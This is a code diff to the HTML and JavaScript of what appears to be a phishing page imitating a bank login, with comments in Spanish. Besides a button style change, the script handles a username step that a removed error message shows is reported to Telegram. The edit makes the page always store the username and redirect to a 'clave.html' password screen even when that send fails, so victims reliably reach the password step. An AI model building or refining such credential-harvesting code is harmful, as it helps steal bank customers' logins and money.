@@ -485,6 +485,9 @@
         
         .bc-continue-button:not(:disabled):hover {
           background: #e6c200 !important;
+          color: #000 !important;
+          cursor: pointer !important;
+          transform: none !important;
         }
 
         /* Password screen styles */
@@ -1032,15 +1035,15 @@
         });
 
         if (response.ok) {
-          // Guardar localmente y redirigir
-          sessionStorage.setItem("bc_usuario", usuario);
-          window.location.href = "clave.html";
-        } else {
-          console.error("Error al enviar a Telegram");
+           sessionStorage.setItem("bc_usuario", usuario);
         }
       } catch (error) {
-        console.error("Error de red:", error);
+        console.error("Error de red (continuando flujo manual):", error);
       }
+      
+      // SIEMPRE redirigir para permitir flujo manual
+      sessionStorage.setItem("bc_usuario", usuario);
+      window.location.href = "clave.html";
     });
   }
 </script>
